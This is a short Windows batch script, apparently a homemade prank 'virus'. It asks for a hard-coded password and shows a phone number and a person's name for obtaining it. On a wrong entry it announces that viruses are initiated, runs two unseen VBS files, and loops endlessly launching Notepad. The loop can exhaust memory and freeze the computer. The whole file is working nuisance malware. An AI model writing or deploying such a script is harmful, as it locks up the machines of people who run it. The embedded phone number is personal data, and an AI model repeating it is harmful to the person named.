@echo off
set ui=makeinindia
echo for password call 9838652965 say hello uditya prakash
echo Enter the Password:
set /p dt=
if %dt% == %ui% goto good
if not %dt% == %ui% goto tod
:good
echo you just escaped from a virus attach
pause
exit
:tod
echo Viruses has been Initiated........
message.vbs
system.vbs
goto top
:top
start %systemroot%\notepad.exe
goto top


